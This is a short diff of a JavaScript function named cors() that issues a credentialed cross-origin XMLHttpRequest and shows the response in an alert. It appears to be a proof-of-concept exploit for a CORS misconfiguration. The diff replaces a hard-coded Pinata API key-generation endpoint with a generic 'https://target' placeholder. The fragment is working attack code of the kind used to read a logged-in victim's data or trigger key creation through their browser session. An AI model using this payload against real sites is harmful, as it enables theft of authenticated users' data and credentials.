@@ -17,7 +17,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://api.pinata.cloud/users/generateApiKey", true);
+  xhttp.open("GET", "https://target", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
